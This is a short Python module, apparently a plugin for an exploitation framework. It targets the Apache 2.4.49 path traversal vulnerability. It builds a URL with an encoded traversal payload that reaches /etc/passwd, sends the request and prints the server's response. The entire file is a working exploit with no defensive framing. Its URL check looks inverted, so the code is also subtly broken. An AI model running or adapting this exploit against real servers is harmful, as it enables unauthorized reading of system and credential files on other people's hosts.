#!/usr/bin/env python3
# -*- encoding: utf-8 -*-
import sys
import os
import requests
import urllib3
from rich.console import Console
from rich.table import Table

class Module:
    def __init__(self, logger):
        self.logger = logger
        self.options = {
            "url": {"value": None, "required": True},
        }
    
    def info(self):
        console = Console()
        table = Table()
        table.add_column("Author")
        table.add_column("Description")
        table.add_column("Other")
        table.add_row("Apache"," Apache 2.4.49 Path Traversal","-")
        console.print(table)       

    def run(self):
        for key in self.options:
            if (
                self.options[key]["value"] is None
                and self.options[key]["required"] is True
            ):
                self.logger.error("Required key {} is not set".format(key))
                return

        if not self.options["url"]["value"].startswith("http"):
            url =  self.options["url"]["value"]
            print("\033[32m[Target]\033[0m",url)
            payload = "//cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
            exp_url = url + payload
            try:
                http = urllib3.PoolManager()
                r = http.request('GET',exp_url)
                print(r.data)
            except:
                print("[-] Vulnerability does not exist.")
